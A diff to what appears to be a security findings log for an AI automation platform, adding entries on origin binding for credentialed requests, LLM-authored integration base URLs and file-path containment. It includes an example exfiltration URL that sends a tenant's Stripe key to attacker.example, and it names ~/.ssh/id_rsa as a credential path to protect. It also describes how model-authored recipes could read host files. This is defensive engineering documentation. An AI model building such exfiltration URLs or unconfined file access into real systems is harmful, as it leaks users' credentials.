@@ -6,6 +6,57 @@ the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings us
 
 ## OPEN
 
+- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
+  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
+  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
+  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
+  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
+  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
+  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
+  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
+  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
+  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
+  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
+  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
+  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
+  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
+  request, so a refused destination never sees the credential; the refusal does not echo the
+  attacker-chosen URL into the persisted record. The interim binding is derived from the
+  integration's own declared base URLs via a fail-closed seam
+  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
+  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
+  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
+  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
+- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
+  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
+  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
+  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
+  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
+  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
+  is derived from the package's own declared host, so binding it to itself is tautological. A
+  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
+  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
+  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
+  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
+  user-facing approval surface, not a filter.
+- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
+  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
+  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
+  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
+  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
+  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
+  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
+  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
+  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
+  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
+  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
+  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
+  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
+  workspace root, not the host home directory. An absolute host path is REFUSED rather than
+  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
+  caught by its own test: it turned a containment breach into a confusing ENOENT).
+  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
+  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
 - **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
   Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
   and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
